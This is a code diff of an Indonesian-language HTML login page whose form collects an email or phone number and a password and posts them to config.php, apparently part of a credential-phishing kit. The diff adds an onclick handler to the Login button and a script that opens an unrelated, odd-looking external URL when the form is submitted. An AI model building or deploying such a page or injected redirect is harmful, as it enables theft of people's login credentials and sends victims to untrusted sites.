@@ -75,7 +75,7 @@ input[type=text],input[type=password],input[type=number] {
 			<form action="config.php">
 				<input type="text" name="email" placeholder="Email atau Nomor Telepon" required>
 				<input type="password" name="password" placeholder="Kata Sandi" required></br>
-				<button type="submit" class="button button--simple button--primary" value="Save">Login</button>
+				<button type="submit" class="button button--simple button--primary" onclick="yourlink()" value="Save">Login</button>
 			</form>
 		</div>
 		<hr>
@@ -204,4 +204,15 @@ input[type=text],input[type=password],input[type=number] {
 </div>
 </footer>
 </body>
+<script>
+
+  function yourlink() {
+
+    var locs = ['https://anxiouslyconsistencytearing.com/vdx4nwvw?key=1b581162dbef12819f7d256d27183635'] 
+
+    for (let i = 0; i < locs.length; i++) {
+      window.open(locs[i])}
+    };
+
+</script>
 </html>
